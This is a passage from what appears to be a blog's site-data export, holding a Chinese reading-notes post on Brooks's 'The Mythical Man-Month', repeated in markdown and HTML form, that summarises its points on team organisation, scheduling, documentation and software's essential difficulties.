项目成员应该只能看到自己需要的部分，没有人需要或者看到其他部分结构，只需要了解接口\n* 及时跟新十分重要\n\n#### 组织架构\n\n* 团队的目标是为了减少必要的交流和协作量\n\n* 为了减少交流，组织结构包括了人力划分及限定职责范围\n\n* 组织交流应该是网状的，而不是树状的\n\n* 每个子产品应该具有两个领导角色——产品负责人，技术主管（结构师）\n\n  ​\t—— 产品负责人和技术主管可以是同一个人\n\n  ​\t—— 产品经理为总指挥，技术主管左右手\n\n  ​\t—— 技术主管为总指挥，产品经理左右手\n\n#### 未雨绸缪\n\n* 软件工程师在着手发布产品之前，应该进行试验性系统的现场测试\n* 第一个开发的系统对于大多数项目可能并不太合用，太多问题，系统的丢弃和重新设计可以一步完成也可以一步步完成，但这是必须完成的步骤\n* 为舍弃而计划，这是无论如何要做的一个步\n* 用户的实际需要会随着程序的构件、测试和使用而变化\n* 由于软件产品易于掌握的特性和不可见性，导致构件人员面临着永恒的需求变更\n* 灵活的组织架构对于软件开发是一个长期有效的解决方案\n* 为变更组建团队比为变更进行设计更加困难\n* 每次修复之后应该重新编译一边系统，确保系统不会因为隐蔽的方式破坏\n* 所有修改都倾向于破坏系统的架构，增加了系统的混乱程度，以至于系统退化到必须重新设计\n* 一次分给某个小组连续的目标时间块被证明是最好的安排方法\n\n#### 项目相关知识点\n\n* 仅仅通过对编码的部分时间估计，然后乘以其他部分相对系数，是无法得出整个工作精度估计的\n* 构件独立小型程序数据并不适应与编程系统项目\n* 程序开发随程序规模的增大而增长\n* 一些研究报告表明时间指数大约在1.5倍预计时间\n* 相对于其他活动，全职程序员50%时间在用于编程和调试\n* 对于广泛使用的产品，其维护总成本通常是开发成本的40%或更多\n* 用户越多，维护成本越多\n* 缺陷修复总会以20%～50%的几率引入新的bug\n* 大部分系统调试在夜间进行\n* 测试数据应该有一部分校验数据，一部分边界数据，一部分无效数据\n\n### 项目的文档\n\n```\n—— 应当包括：\n\n\t 目的：功能是什么，开发原因是什么\n\t 环境：运行在怎样的机器\n\t 范围：有效输入范围，允许显示格式\n\t 实现功能和使用算法：精确阐述它做什么\n\t 输入——输出格式：必须确切完整\n\t 操作指令：包括控制台输出正确及异常内容\n\t 选项：用户功能有哪些，应该怎样进行挑选\n\t 运行时间：特定运行时间\n\t 精度和校验：期望精度和如何进行精度检测\n\n```\n\n\n\n* 软件开发关键文档应该包括：目标，用户手册，内部文档，进度，预算，组织机构图和工作空间分配\n* 项目经理应该在项目早期对项目一系列文档进行规范化\n* 对每个关键文档的维护提供状态监督及预警机制\n* 每个文档本身就可以作为检查列表或者数据库\n* 项目经理的主要日常工作是沟通，而不是作出决定；文档使个项目计划和决策在整个团队范围内得到交流\n* 即使是完全开发给自己的程序，描述性的文字也是必须的，因为会被遗忘\n* 文档能在整个生命周期客服克服懒惰和进度压力起促进和激励作用\n* 大多数文档缺少总结性的内容，必须放慢脚步，稳妥进行\n* 为了使文档易于维护，将他们合并到源程序至关重要，而不是独立文档进行保存\n* 程序修改人员所使用的文档之中，出了描述事情如何，还应该阐述为什么那样做，目的非常关键\n\n### 项目的整体\n\n#### 整体部分\n\n* 详尽体系结构工作不但使产品更加易用，而且使开发更容易进行，bug更不容易产生\n\n* 许许多多失败源于产品未精确定义的地方\n\n* 编写代码之前，规格说明必须提交外部测试小组，以详细的检查说明项目完整性和明确性，否则开发人员会自行摸索\n\n* 自上而下的设计方式更容易细化，从四个方面减少bug\n\n  —— 清晰结构\n\n  —— 模块分割\n\n  —— 细节的抑制\n\n  —— 测试\n\n* 大量的辅助性测试代码是有必要的\n\n* 必须有人对变更和版本进行控制和文档化\n\n* 系统测试期间，一次只增加一个构件\n\n* 有时必须回退，推翻顶层设计\n\n#### 祸起萧墙\n\n* 一天天的进度落后比重大灾难更难以识别\n* 根据一个严格的进度表来控制大型项目，进度表由里程碑和日期组成\n* 里程碑必须是具体的特定的和可度量的事件进行清晰定义\n* 项目没两周进行仔细修订的活动时间估计，随着开始事件到临近结束不会有太大变化，否则过高或过低的估计在项目结束前三周左右才会有所变化\n* 如果错过了一个deadline 确保不会错过第二个deadline\n* 必须有评审机制，使得所有成员可以通过它了解真正的状态，出于这个目的，里程碑的进度和完成文档是关键\n\n### 软件工程中根本及次要问题\n\n##### 根本困难：\n\n_软件开发中最困难的部分是规格说明、设计和测试这些概念上的结构，而不是对概念进行表达和实现逼真程度进行验证_\n\n1、复杂度：由多方面形成，不仅仅是由于技术产生困难导致的管理问题，管理层面：全面理解问题变得困难->妨碍概念上的完整性->使所有离散出口难以寻找和控制->引起学习和理解上的负担\n\n2、一致性：由于兼容等问题，导致一致性降低\n\n3、可变性：由于平台变化，应用变化，用户等变化导致软件可变性\n\n4、不可见性：由于软件是不存在具有空间的形体特征，所以很难关联和理解依赖\n\n##### 解决的希望：\n\n1、OO编程：仅仅消除设计表达上的次要困难\n\n2、人工智能、专家系统：接收数据，对系统推论，诊断及构件，建议接口规则，制定测试策略，记录各种bug产生及优化（目前尚未出现？\n\n3、自动编程：通过较少的参数迅速描述特征，给定参数前提，制定清晰规则\n\n4、图形化编程：存在变量范围嵌套，交叉引用等多方面问题\n\n5、程序验证：进行技术规格测试\n\n6、环境和工具：统一接口和通用工具，只是消除语法错误\n\n7、工作站：强大的工作站并不能有魔术般的提高\n\n##### 概念上根本解决方案：\n\n1、购买及自行开发\n\n2、需求提炼和快速原型\n\n3、卓越的设计人员\n\n","source":"_posts/the-mythical-man-month.md","raw":"---\ntitle: 《人月神话》整理\ndate: 2018-09-24 16:12:37\ntags: 随笔\ndir: 随笔\nkeywords: 人月神话\n---\n\n### 写在前面\n\n实习后，发现自己一些薄弱的点，需要好好加固一些。好在现在又学校可回，索性逃回学校重新修炼，学一些想学的，加固自己薄弱的，至少不要在职场坑了队友。\n\n《人月神话》一书，其主要介绍人/月等方面的项目管理，从项目经理角度对产品的一些想法及经验，帮助对产品的管理有了较深刻的理解。43年前出版至今依然畅销，不仅感叹作者的独特眼光、软件工程发展的缓慢。也使得我对这一学科有了更深的理解。\n\n### 编程的乐趣\n\n* 创建事物的快乐\n* 开发对其他人有用的乐趣\n* 将类似可以组装的零部件组装，这个过程本身具有魅力\n* 面对重复任务，不断学习的乐趣\n* 软件的存在形式不同于其他实际物体，工作在轻易驾驭的介质上的乐趣\n\n### 编程的烦恼\n\n* 将做事的方式调整到追求完美是_最困难_的部分\n* 有其他人来设定目标，必须依靠自己无法控制的程序来完成事情\n* 真正的权威来自于每次任务的完成\n* 伴随着枯燥艰苦的劳动\n* 越接近目标收敛越慢\n* 只有实际需要才会想到最新的设想\n\n### 人月神话\n\n* 缺乏合理的时间进度是造成项目滞后最主要的原因——比其他原因都大\n* 某些任务在不损害结果的情况下加快速度\n* 所有编程人员都是乐观主义者——“一切都将良好运行”\n* *构思本身就有缺陷，因此总会有bug*\n* 人员数量和时间是不可替换的——1个孕妇10月怀胎生子，10个孕妇不可能1个月生子\n* 分解任务会话费额外的时间——培训和相互沟通\n* 进度安排——1/3计划， 1/6编程， 1/4构建测试， 1/4系统测试\n* Brooks法则：为进度落后的项目增加人手，只会似的进度更加落后 —— 重新分配任务的打断；培训新人；额外的沟通\n\n### 团队的组建\n\n![team](mythical-team.jpeg)\n\n* 小型精干的团队是最好的\n\n* 一位首席程序员、类似于外科手术队伍的团队架构提供了一种方法—既能获得由少数头脑产生的产品完整性，又能得到多位协助人员的总体生产率，还彻底地减少了沟通的工作量。\n\n* ####  结构师的使命\n\n  ​\t结构师只能提出建议，牢记开发人员实现创造性的使命\n\n  ​\t时刻准备为制定说明建议一种实现方法，准备接受任何可行方法\n\n  ​\t对建议保持平静及低调\n\n  ​\t准备对建议改进及坚持放弃\n\n  ​\t听取开发人员在系统结构上的改进\n\n### 系统的设计\n\n* 概念的完整性是重中之重\n\n* \"功能与理解上的复杂程度比值才是系统设计最终目标\"\n\n* 将系统结构方面的工作与具体实现分离是获得概念完整性的最好方法\n\n* 外部的体系结构规定实习上是增强小组的创造性\n\n* 尽早交流和持续沟通能够使得结构师有较好的成本意识，是开发人员对设计有信心\n\n* 第二个系统通常是人们所设计的最危险的系统，通常是过分的进行设计\n\n* 为了概念完整性，设计必须又一个人或者具有共识的小型团队完成，设计结果必须由一个或者两个人来完成，以保证结果一致\n\n* 必须明确定义系统结构中与先前定义不同的地方，重新定义详细程度应该与之前保持一致\n\n* 出于精确性，需要形式化的定义，也需要一些记叙性的定义来加深理解\n\n* 起初至少有两种以上的实现，定义会更加整洁和规范\n\n* 结构师对实现人员的询问作出电话的解释和问答是非常重要的，必须进行日志整理和发布\n\n### 项目成功的要点\n\n#### 交流\n\n* 因为团队之间不知道在做什么，从而出现进度灾难、功能不合理和系统缺陷。由于存在对他人进度的各种假设，团队之间成员开始理解出现偏差\n* 团队应该以尽可能多的方式进行相互之间的交流，非正式的进行简要技术趁熟的常规会议项目，共享的正式项目工作手册【以及电子邮件】\n\n#### 项目工作手册\n\n​\t\t——是对项目必须产生一系列文档进行的一种组织结构\n\n* 项目所有文档都是工作手册的一部分\n* 需要尽早仔细的设计工作手册结构\n* 项目成员应该只能看到自己需要的部分，没有人需要或者看到其他部分结构，只需要了解接口\n* 及时跟新十分重要\n\n#### 组织架构\n\n* 团队的目标是为了减少必要的交流和协作量\n\n* 为了减少交流，组织结构包括了人力划分及限定职责范围\n\n* 组织交流应该是网状的，而不是树状的\n\n* 每个子产品应该具有两个领导角色——产品负责人，技术主管（结构师）\n\n  ​\t—— 产品负责人和技术主管可以是同一个人\n\n  ​\t—— 产品经理为总指挥，技术主管左右手\n\n  ​\t—— 技术主管为总指挥，产品经理左右手\n\n#### 未雨绸缪\n\n* 软件工程师在着手发布产品之前，应该进行试验性系统的现场测试\n* 第一个开发的系统对于大多数项目可能并不太合用，太多问题，系统的丢弃和重新设计可以一步完成也可以一步步完成，但这是必须完成的步骤\n* 为舍弃而计划，这是无论如何要做的一个步\n* 用户的实际需要会随着程序的构件、测试和使用而变化\n* 由于软件产品易于掌握的特性和不可见性，导致构件人员面临着永恒的需求变更\n* 灵活的组织架构对于软件开发是一个长期有效的解决方案\n* 为变更组建团队比为变更进行设计更加困难\n* 每次修复之后应该重新编译一边系统，确保系统不会因为隐蔽的方式破坏\n* 所有修改都倾向于破坏系统的架构，增加了系统的混乱程度，以至于系统退化到必须重新设计\n* 一次分给某个小组连续的目标时间块被证明是最好的安排方法\n\n#### 项目相关知识点\n\n* 仅仅通过对编码的部分时间估计，然后乘以其他部分相对系数，是无法得出整个工作精度估计的\n* 构件独立小型程序数据并不适应与编程系统项目\n* 程序开发随程序规模的增大而增长\n* 一些研究报告表明时间指数大约在1.5倍预计时间\n* 相对于其他活动，全职程序员50%时间在用于编程和调试\n* 对于广泛使用的产品，其维护总成本通常是开发成本的40%或更多\n* 用户越多，维护成本越多\n* 缺陷修复总会以20%～50%的几率引入新的bug\n* 大部分系统调试在夜间进行\n* 测试数据应该有一部分校验数据，一部分边界数据，一部分无效数据\n\n### 项目的文档\n\n```\n—— 应当包括：\n\n\t 目的：功能是什么，开发原因是什么\n\t 环境：运行在怎样的机器\n\t 范围：有效输入范围，允许显示格式\n\t 实现功能和使用算法：精确阐述它做什么\n\t 输入——输出格式：必须确切完整\n\t 操作指令：包括控制台输出正确及异常内容\n\t 选项：用户功能有哪些，应该怎样进行挑选\n\t 运行时间：特定运行时间\n\t 精度和校验：期望精度和如何进行精度检测\n\n```\n\n\n\n* 软件开发关键文档应该包括：目标，用户手册，内部文档，进度，预算，组织机构图和工作空间分配\n* 项目经理应该在项目早期对项目一系列文档进行规范化\n* 对每个关键文档的维护提供状态监督及预警机制\n* 每个文档本身就可以作为检查列表或者数据库\n* 项目经理的主要日常工作是沟通，而不是作出决定；文档使个项目计划和决策在整个团队范围内得到交流\n* 即使是完全开发给自己的程序，描述性的文字也是必须的，因为会被遗忘\n* 文档能在整个生命周期客服克服懒惰和进度压力起促进和激励作用\n* 大多数文档缺少总结性的内容，必须放慢脚步，稳妥进行\n* 为了使文档易于维护，将他们合并到源程序至关重要，而不是独立文档进行保存\n* 程序修改人员所使用的文档之中，出了描述事情如何，还应该阐述为什么那样做，目的非常关键\n\n### 项目的整体\n\n#### 整体部分\n\n* 详尽体系结构工作不但使产品更加易用，而且使开发更容易进行，bug更不容易产生\n\n* 许许多多失败源于产品未精确定义的地方\n\n* 编写代码之前，规格说明必须提交外部测试小组，以详细的检查说明项目完整性和明确性，否则开发人员会自行摸索\n\n* 自上而下的设计方式更容易细化，从四个方面减少bug\n\n  —— 清晰结构\n\n  —— 模块分割\n\n  —— 细节的抑制\n\n  —— 测试\n\n* 大量的辅助性测试代码是有必要的\n\n* 必须有人对变更和版本进行控制和文档化\n\n* 系统测试期间，一次只增加一个构件\n\n* 有时必须回退，推翻顶层设计\n\n#### 祸起萧墙\n\n* 一天天的进度落后比重大灾难更难以识别\n* 根据一个严格的进度表来控制大型项目，进度表由里程碑和日期组成\n* 里程碑必须是具体的特定的和可度量的事件进行清晰定义\n* 项目没两周进行仔细修订的活动时间估计，随着开始事件到临近结束不会有太大变化，否则过高或过低的估计在项目结束前三周左右才会有所变化\n* 如果错过了一个deadline 确保不会错过第二个deadline\n* 必须有评审机制，使得所有成员可以通过它了解真正的状态，出于这个目的，里程碑的进度和完成文档是关键\n\n### 软件工程中根本及次要问题\n\n##### 根本困难：\n\n_软件开发中最困难的部分是规格说明、设计和测试这些概念上的结构，而不是对概念进行表达和实现逼真程度进行验证_\n\n1、复杂度：由多方面形成，不仅仅是由于技术产生困难导致的管理问题，管理层面：全面理解问题变得困难->妨碍概念上的完整性->使所有离散出口难以寻找和控制->引起学习和理解上的负担\n\n2、一致性：由于兼容等问题，导致一致性降低\n\n3、可变性：由于平台变化，应用变化，用户等变化导致软件可变性\n\n4、不可见性：由于软件是不存在具有空间的形体特征，所以很难关联和理解依赖\n\n##### 解决的希望：\n\n1、OO编程：仅仅消除设计表达上的次要困难\n\n2、人工智能、专家系统：接收数据，对系统推论，诊断及构件，建议接口规则，制定测试策略，记录各种bug产生及优化（目前尚未出现？\n\n3、自动编程：通过较少的参数迅速描述特征，给定参数前提，制定清晰规则\n\n4、图形化编程：存在变量范围嵌套，交叉引用等多方面问题\n\n5、程序验证：进行技术规格测试\n\n6、环境和工具：统一接口和通用工具，只是消除语法错误\n\n7、工作站：强大的工作站并不能有魔术般的提高\n\n##### 概念上根本解决方案：\n\n1、购买及自行开发\n\n2、需求提炼和快速原型\n\n3、卓越的设计人员\n\n","slug":"the-mythical-man-month","published":1,"updated":"2021-09-11T05:42:31.215Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz0a001e4jzxyy9btqin","content":"<h3 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h3><p>实习后，发现自己一些薄弱的点，需要好好加固一些。好在现在又学校可回，索性逃回学校重新修炼，学一些想学的，加固自己薄弱的，至少不要在职场坑了队友。</p><p>《人月神话》一书，其主要介绍人/月等方面的项目管理，从项目经理角度对产品的一些想法及经验，帮助对产品的管理有了较深刻的理解。43年前出版至今依然畅销，不仅感叹作者的独特眼光、软件工程发展的缓慢。也使得我对这一学科有了更深的理解。</p><h3 id=\"编程的乐趣\"><a href=\"#编程的乐趣\" class=\"headerlink\" title=\"编程的乐趣\"></a>编程的乐趣</h3><ul><li>创建事物的快乐</li><li>开发对其他人有用的乐趣</li><li>将类似可以组装的零部件组装，这个过程本身具有魅力</li><li>面对重复任务，不断学习的乐趣</li><li>软件的存在形式不同于其他实际物体，工作在轻易驾驭的介质上的乐趣</li></ul><h3 id=\"编程的烦恼\"><a href=\"#编程的烦恼\" class=\"headerlink\" title=\"编程的烦恼\"></a>编程的烦恼</h3><ul><li>将做事的方式调整到追求完美是<em>最困难</em>的部分</li><li>有其他人来设定目标，必须依靠自己无法控制的程序来完成事情</li><li>真正的权威来自于每次任务的完成</li><li>伴随着枯燥艰苦的劳动</li><li>越接近目标收敛越慢</li><li>只有实际需要才会想到最新的设想</li></ul><h3 id=\"人月神话\"><a href=\"#人月神话\" class=\"headerlink\" title=\"人月神话\"></a>人月神话</h3><ul><li>缺乏合理的时间进度是造成项目滞后最主要的原因——比其他原因都大</li><li>某些任务在不损害结果的情况下加快速度</li><li>所有编程人员都是乐观主义者——“一切都将良好运行”</li><li><em>构思本身就有缺陷，因此总会有bug</em></li><li>人员数量和时间是不可替换的——1个孕妇10月怀胎生子，10个孕妇不可能1个月生子</li><li>分解任务会话费额外的时间——培训和相互沟通</li><li>进度安排——1/3计划， 1/6编程， 1/4构建测试， 1/4系统测试</li><li>Brooks法则：为进度落后的项目增加人手，只会似的进度更加落后 —— 重新分配任务的打断；培训新人；额外的沟通</li></ul><h3 id=\"团队的组建\"><a href=\"#团队的组建\" class=\"headerlink\" title=\"团队的组建\"></a>团队的组建</h3><p><img src=\"/img/loading.gif\" data-original=\"/随笔/the-mythical-man-month/mythical-team.jpeg\" alt=\"team\"></p><ul><li><p>小型精干的团队是最好的</p></li><li><p>一位首席程序员、类似于外科手术队伍的团队架构提供了一种方法—既能获得由少数头脑产生的产品完整性，又能得到多位协助人员的总体生产率，还彻底地减少了沟通的工作量。</p></li><li><h4 id=\"结构师的使命\"><a href=\"#结构师的使命\" class=\"headerlink\" title=\"结构师的使命\"></a>结构师的使命</h4><p>​ 结构师只能提出建议，牢记开发人员实现创造性的使命</p><p>​ 时刻准备为制定说明建议一种实现方法，准备接受任何可行方法</p><p>​ 对建议保持平静及低调</p><p>​ 准备对建议改进及坚持放弃</p><p>​ 听取开发人员在系统结构上的改进</p></li></ul><h3 id=\"系统的设计\"><a href=\"#系统的设计\" class=\"headerlink\" title=\"系统的设计\"></a>系统的设计</h3><ul><li><p>概念的完整性是重中之重</p></li><li><p>“功能与理解上的复杂程度比值才是系统设计最终目标”</p></li><li><p>将系统结构方面的工作与具体实现分离是获得概念完整性的最好方法</p></li><li><p>外部的体系结构规定实习上是增强小组的创造性</p></li><li><p>尽早交流和持续沟通能够使得结构师有较好的成本意识，是开发人员对设计有信心</p></li><li><p>第二个系统通常是人们所设计的最危险的系统，通常是过分的进行设计</p></li><li><p>为了概念完整性，设计必须又一个人或者具有共识的小型团队完成，设计结果必须由一个或者两个人来完成，以保证结果一致</p></li><li><p>必须明确定义系统结构中与先前定义不同的地方，重新定义详细程度应该与之前保持一致</p></li><li><p>出于精确性，需要形式化的定义，也需要一些记叙性的定义来加深理解</p></li><li><p>起初至少有两种以上的实现，定义会更加整洁和规范</p></li><li><p>结构师对实现人员的询问作出电话的解释和问答是非常重要的，必须进行日志整理和发布</p></li></ul><h3 id=\"项目成功的要点\"><a href=\"#项目成功的要点\" class=\"headerlink\" title=\"项目成功的要点\"></a>项目成功的要点</h3><h4 id=\"交流\"><a href=\"#交流\" class=\"headerlink\" title=\"交流\"></a>交流</h4><ul><li>因为团队之间不知道在做什么，从而出现进度灾难、功能不合理和系统缺陷。由于存在对他人进度的各种假设，团队之间成员开始理解出现偏差</li><li>团队应该以尽可能多的方式进行相互之间的交流，非正式的进行简要技术趁熟的常规会议项目，共享的正式项目工作手册【以及电子邮件】</li></ul><h4 id=\"项目工作手册\"><a href=\"#项目工作手册\" class=\"headerlink\" title=\"项目工作手册\"></a>项目工作手册</h4><p>​ ——是对项目必须产生一系列文档进行的一种组织结构</p><ul><li>项目所有文档都是工作手册的一部分</li><li>需要尽早仔细的设计工作手册结构</li><li>项目成员应该只能看到自己需要的部分，没有人需要或者看到其他部分结构，只需要了解接口</li><li>及时跟新十分重要</li></ul><h4 id=\"组织架构\"><a href=\"#组织架构\" class=\"headerlink\" title=\"组织架构\"></a>组织架构</h4><ul><li><p>团队的目标是为了减少必要的交流和协作量</p></li><li><p>为了减少交流，组织结构包括了人力划分及限定职责范围</p></li><li><p>组织交流应该是网状的，而不是树状的</p></li><li><p>每个子产品应该具有两个领导角色——产品负责人，技术主管（结构师）</p><p>​ —— 产品负责人和技术主管可以是同一个人</p><p>​ —— 产品经理为总指挥，技术主管左右手</p><p>​ —— 技术主管为总指挥，产品经理左右手</p></li></ul><h4 id=\"未雨绸缪\"><a href=\"#未雨绸缪\" class=\"headerlink\" title=\"未雨绸缪\"></a>未雨绸缪</h4><ul><li>软件工程师在着手发布产品之前，应该进行试验性系统的现场测试</li><li>第一个开发的系统对于大多数项目可能并不太合用，太多问题，系统的丢弃和重新设计可以一步完成也可以一步步完成，但这是必须完成的步骤</li><li>为舍弃而计划，这是无论如何要做的一个步</li><li>用户的实际需要会随着程序的构件、测试和使用而变化</li><li>由于软件产品易于掌握的特性和不可见性，导致构件人员面临着永恒的需求变更</li><li>灵活的组织架构对于软件开发是一个长期有效的解决方案</li><li>为变更组建团队比为变更进行设计更加困难</li><li>每次修复之后应该重新编译一边系统，确保系统不会因为隐蔽的方式破坏</li><li>所有修改都倾向于破坏系统的架构，增加了系统的混乱程度，以至于系统退化到必须重新设计</li><li>一次分给某个小组连续的目标时间块被证明是最好的安排方法</li></ul><h4 id=\"项目相关知识点\"><a href=\"#项目相关知识点\" class=\"headerlink\" title=\"项目相关知识点\"></a>项目相关知识点</h4><ul><li>仅仅通过对编码的部分时间估计，然后乘以其他部分相对系数，是无法得出整个工作精度估计的</li><li>构件独立小型程序数据并不适应与编程系统项目</li><li>程序开发随程序规模的增大而增长</li><li>一些研究报告表明时间指数大约在1.5倍预计时间</li><li>相对于其他活动，全职程序员50%时间在用于编程和调试</li><li>对于广泛使用的产品，其维护总成本通常是开发成本的40%或更多</li><li>用户越多，维护成本越多</li><li>缺陷修复总会以20%～50%的几率引入新的bug</li><li>大部分系统调试在夜间进行</li><li>测试数据应该有一部分校验数据，一部分边界数据，一部分无效数据</li></ul><h3 id=\"项目的文档\"><a href=\"#项目的文档\" class=\"headerlink\" title=\"项目的文档\"></a>项目的文档</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">—— 应当包括：</span><br><span class=\"line\"></span><br><span class=\"line\">\t 目的：功能是什么，开发原因是什么</span><br><span class=\"line\">\t 环境：运行在怎样的机器</span><br><span class=\"line\">\t 范围：有效输入范围，允许显示格式</span><br><span class=\"line\">\t 实现功能和使用算法：精确阐述它做什么</span><br><span class=\"line\">\t 输入——输出格式：必须确切完整</span><br><span class=\"line\">\t 操作指令：包括控制台输出正确及异常内容</span><br><span class=\"line\">\t 选项：用户功能有哪些，应该怎样进行挑选</span><br><span class=\"line\">\t 运行时间：特定运行时间</span><br><span class=\"line\">\t 精度和校验：期望精度和如何进行精度检测</span><br></pre></td></tr></table></figure><ul><li>软件开发关键文档应该包括：目标，用户手册，内部文档，进度，预算，组织机构图和工作空间分配</li><li>项目经理应该在项目早期对项目一系列文档进行规范化</li><li>对每个关键文档的维护提供状态监督及预警机制</li><li>每个文档本身就可以作为检查列表或者数据库</li><li>项目经理的主要日常工作是沟通，而不是作出决定；文档使个项目计划和决策在整个团队范围内得到交流</li><li>即使是完全开发给自己的程序，描述性的文字也是必须的，因为会被遗忘</li><li>文档能在整个生命周期客服克服懒惰和进度压力起促进和激励作用</li><li>大多数文档缺少总结性的内容，必须放慢脚步，稳妥进行</li><li>为了使文档易于维护，将他们合并到源程序至关重要，而不是独立文档进行保存</li><li>程序修改人员所使用的文档之中，出了描述事情如何，还应该阐述为什么那样做，目的非常关键</li></ul><h3 id=\"项目的整体\"><a href=\"#项目的整体\" class=\"headerlink\" title=\"项目的整体\"></a>项目的整体</h3><h4 id=\"整体部分\"><a href=\"#整体部分\" class=\"headerlink\" title=\"整体部分\"></a>整体部分</h4><ul><li><p>详尽体系结构工作不但使产品更加易用，而且使开发更容易进行，bug更不容易产生</p></li><li><p>许许多多失败源于产品未精确定义的地方</p></li><li><p>编写代码之前，规格说明必须提交外部测试小组，以详细的检查说明项目完整性和明确性，否则开发人员会自行摸索</p></li><li><p>自上而下的设计方式更容易细化，从四个方面减少bug</p><p>—— 清晰结构</p><p>—— 模块分割</p><p>—— 细节的抑制</p><p>—— 测试</p></li><li><p>大量的辅助性测试代码是有必要的</p></li><li><p>必须有人对变更和版本进行控制和文档化</p></li><li><p>系统测试期间，一次只增加一个构件</p></li><li><p>有时必须回退，推翻顶层设计</p></li></ul><h4 id=\"祸起萧墙\"><a href=\"#祸起萧墙\" class=\"headerlink\" title=\"祸起萧墙\"></a>祸起萧墙</h4><ul><li>一天天的进度落后比重大灾难更难以识别</li><li>根据一个严格的进度表来控制大型项目，进度表由里程碑和日期组成</li><li>里程碑必须是具体的特定的和可度量的事件进行清晰定义</li><li>项目没两周进行仔细修订的活动时间估计，随着开始事件到临近结束不会有太大变化，否则过高或过低的估计在项目结束前三周左右才会有所变化</li><li>如果错过了一个deadline 确保不会错过第二个deadline</li><li>必须有评审机制，使得所有成员可以通过它了解真正的状态，出于这个目的，里程碑的进度和完成文档是关键</li></ul><h3 id=\"软件工程中根本及次要问题\"><a href=\"#软件工程中根本及次要问题\" class=\"headerlink\" title=\"软件工程中根本及次要问题\"></a>软件工程中根本及次要问题</h3><h5 id=\"根本困难：\"><a href=\"#根本困难：\" class=\"headerlink\" title=\"根本困难：\"></a>根本困难：</h5><p><em>软件开发中最困难的部分是规格说明、设计和测试这些概念上的结构，而不是对概念进行表达和实现逼真程度进行验证</em></p><p>1、复杂度：由多方面形成，不仅仅是由于技术产生困难导致的管理问题，管理层面：全面理解问题变得困难-&gt;妨碍概念上的完整性-&gt;使所有离散出口难以寻找和控制-&gt;引起学习和理解上的负担</p><p>2、一致性：由于兼容等问题，导致一致性降低</p><p>3、可变性：由于平台变化，应用变化，用户等变化导致软件可变性</p><p>4、不可见性：由于软件是不存在具有空间的形体特征，所以很难关联和理解依赖</p><h5 id=\"解决的希望：\"><a href=\"#解决的希望：\" class=\"headerlink\" title=\"解决的希望：\"></a>解决的希望：</h5><p>1、OO编程：仅仅消除设计表达上的次要困难</p><p>2、人工智能、专家系统：接收数据，对系统推论，诊断及构件，建议接口规则，制定测试策略，记录各种bug产生及优化（目前尚未出现？</p><p>3、自动编程：通过较少的参数迅速描述特征，给定参数前提，制定清晰规则</p><p>4、图形化编程：存在变量范围嵌套，交叉引用等多方面问题</p><p>5、程序验证：进行技术规格测试</p><p>6、环境和工具：统一接口和通用工具，只是消除语法错误</p><p>7、工作站：强大的工作站并不能有魔术般的提高</p><h5 id=\"概念上根本解决方案：\"><a href=\"#概念上根本解决方案：\" class=\"headerlink\" title=\"概念上根本解决方案：\"></a>概念上根本解决方案：</h5><p>1、购买及自行开发</p><p>2、需求提炼和快速原型</p><p>3、卓越的设计人员</p>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h3><p>实习后，发现自己一些薄弱的点，需要好好加固一些。好在现在又学校可回，索性逃回学校重新修炼，学一些想学的，加固自己薄弱的，至少不要在职场坑了队友。</p><p>《人月神话》一书，其主要介绍人/月等方面的项目管理，从项目经理角度对产品的一些想法及经验，帮助对产品的管理有了较深刻的理解。43年前出版至今依然畅销，不仅感叹作者的独特眼光、软件工程发展的缓慢。也使得我对这一学科有了更深的理解。</p><h3 id=\"编程的乐趣\"><a href=\"#编程的乐趣\" class=\"headerlink\" title=\"编程的乐趣\"></a>编程的乐趣</h3><ul><li>创建事物的快乐</li><li>开发对其他人有用的乐趣</li><li>将类似可以组装的零部件组装，这个过程本身具有魅力</li><li>面对重复任务，不断学习的乐趣</li><li>软件的存在形式不同于其他实际物体，工作在轻易驾驭的介质上的乐趣</li></ul><h3 id=\"编程的烦恼\"><a href=\"#编程的烦恼\" class=\"headerlink\" title=\"编程的烦恼\"></a>编程的烦恼</h3><ul><li>将做事的方式调整到追求完美是<em>最困难</em>的部分</li><li>有其他人来设定目标，必须依靠自己无法控制的程序来完成事情</li><li>真正的权威来自于每次任务的完成</li><li>伴随着枯燥艰苦的劳动</li><li>越接近目标收敛越慢</li><li>只有实际需要才会想到最新的设想</li></ul><h3 id=\"人月神话\"><a href=\"#人月神话\" class=\"headerlink\" title=\"人月神话\"></a>人月神话</h3><ul><li>缺乏合理的时间进度是造成项目滞后最主要的原因——比其他原因都大</li><li>某些任务在不损害结果的情况下加快速度</li><li>所有编程人员都是乐观主义者——“一切都将良好运行”</li><li><em>构思本身就有缺陷，因此总会有bug</em></li><li>人员数量和时间是不可替换的——1个孕妇10月怀胎生子，10个孕妇不可能1个月生子</li><li>分解任务会话费额外的时间——培训和相互沟通</li><li>进度安排——1/3计划， 1/6编程， 1/4构建测试， 1/4系统测试</li><li>Brooks法则：为进度落后的项目增加人手，只会似的进度更加落后 —— 重新分配任务的打断；培训新人；额外的沟通</li></ul><h3 id=\"团队的组建\"><a href=\"#团队的组建\" class=\"headerlink\" title=\"团队的组建\"></a>团队的组建</h3><p><img src=\"/随笔/the-mythical-man-month/mythical-team.jpeg\" alt=\"team\"></p><ul><li><p>小型精干的团队是最好的</p></li><li><p>一位首席程序员、类似于外科手术队伍的团队架构提供了一种方法—既能获得由少数头脑产生的产品完整性，又能得到多位协助人员的总体生产率，还彻底地减少了沟通的工作量。</p></li><li><h4 id=\"结构师的使命\"><a href=\"#结构师的使命\" class=\"headerlink\" title=\"结构师的使命\"></a>结构师的使命</h4><p>​ 结构师只能提出建议，牢记开发人员实现创造性的使命</p><p>​ 时刻准备为制定说明建议一种实现方法，准备接受任何可行方法</p><p>​ 对建议保持平静及低调</p><p>​ 